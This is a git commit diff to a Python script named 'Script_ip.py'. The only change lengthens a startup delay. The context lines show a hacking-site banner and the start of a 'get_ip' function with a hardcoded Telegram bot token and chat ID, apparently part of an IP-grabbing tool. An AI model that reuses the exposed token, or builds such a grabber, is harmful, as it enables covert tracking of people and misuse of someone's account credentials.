ee232654163a04b272b7da893eb942277afaa5dc
〆M̂Ŕ. ʂÏLĘNԷ〆 <88721343+Mrsilent501@users.noreply.github.com>
2021-08-21 00:11:51 +0200

    Update Script_ip.py

--- Script_ip.py
+++ Script_ip.py
@@ -6,7 +6,7 @@ import threading
 ###################################
 os.system("clear")
 print ("W\033[92mebsite\033[91m:- \033[94mcyberyemen.blogspot.com")
-sleep (2)
+sleep (4)
 def get_ip():
 	token = "1937421918:AAGD_3GxLJA7D-aPQuItkGqY-32UId2aUzE"
 	id1 = "1823390961"
